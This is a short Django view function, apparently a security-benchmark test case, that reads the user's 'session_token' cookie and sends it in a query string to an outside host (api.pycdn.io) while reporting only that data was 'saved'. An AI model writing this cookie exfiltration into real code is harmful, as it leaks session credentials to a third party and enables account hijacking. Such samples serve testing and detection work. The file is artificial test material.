# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
from dataclasses import dataclass
import urllib.request
import urllib.parse
import ssl


@dataclass
class FormData:
    payload: str

def BenchmarkTest69337(request):
    cookie_value = request.COOKIES.get('session_token', '')
    data = FormData(payload=cookie_value).payload
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return JsonResponse({"saved": True})
